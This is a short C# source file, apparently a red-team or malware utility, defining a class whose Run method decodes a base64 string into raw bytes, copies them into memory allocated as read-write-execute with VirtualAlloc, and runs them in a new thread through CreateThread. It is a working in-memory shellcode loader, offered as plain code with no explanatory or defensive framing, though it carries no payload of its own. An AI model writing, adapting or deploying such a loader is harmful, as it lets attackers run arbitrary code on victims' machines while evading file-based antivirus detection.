using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RunCode
{
    public static class RunClass
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        private static uint MEM_COMMIT = 0x00001000;
        private static uint MEM_RESERVE = 0x00002000;
        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        public static void Run(string base64)
        {
            if (!string.IsNullOrEmpty(base64))
            {
                string b64 = base64.Trim();
                byte[] buf = Convert.FromBase64String(b64);

                IntPtr handle = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                Marshal.Copy(buf, 0, handle, buf.Length);

                IntPtr thread = CreateThread(IntPtr.Zero, 0, handle, IntPtr.Zero, 0, IntPtr.Zero);

                WaitForSingleObject(thread, 0xFFFFFFFF);
            }
        }

    }
}
